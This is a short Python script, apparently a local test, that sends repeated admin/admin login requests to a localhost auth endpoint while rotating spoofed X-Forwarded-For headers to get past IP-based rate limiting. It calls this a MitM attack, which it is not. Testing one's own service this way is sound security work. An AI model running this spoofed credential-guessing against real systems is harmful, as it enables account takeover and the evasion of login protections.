import requests
import random
import time

URL = "http://127.0.0.1:8000/auth/login"

headers_list = [
    {"X-Forwarded-For": "10.0.0.1"},
    {"X-Forwarded-For": "10.0.0.2"},
    {"X-Forwarded-For": "10.0.0.3"},
    {"X-Forwarded-For": "192.168.1.99"},
]

payload = {
    "username": "admin",
    "password": "admin"
}

def mitm_attack():
    for i in range(20):
        headers = random.choice(headers_list)
        r = requests.post(URL, json=payload, headers=headers)
        print(f"[{i+1}] {headers['X-Forwarded-For']} ->", r.status_code)
        time.sleep(0.2)

if __name__ == "__main__":
    print("[*] Simulating MitM-like traffic relay")
    mitm_attack()